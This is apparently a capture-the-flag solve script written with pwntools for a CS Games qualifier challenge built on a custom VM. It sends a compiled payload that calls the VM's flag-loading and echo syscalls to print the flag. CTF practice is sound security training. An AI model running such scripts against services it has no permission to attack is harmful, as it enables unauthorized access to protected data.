#!/usr/bin/env python2
from pwn import *
from compiler import *

host = "csgames-quals.frigon.app"
port = 8200
binary_path = "./vmware"

context.log_level = logging.ERROR

def get_process():
    if args["REMOTE"]:
        return remote(host, port)
    else:
        return process(binary_path)

p = get_process()

if args["PAUSE"]:
    pause()

payload = [
    movi, rax, imm(sys_load_flag),
    syscall,
    movi, rax, imm(sys_echo),
    movi, rbx, imm(0x4),
    syscall,
    hlt
]

p.sendline(compile(payload))
p.interactive()

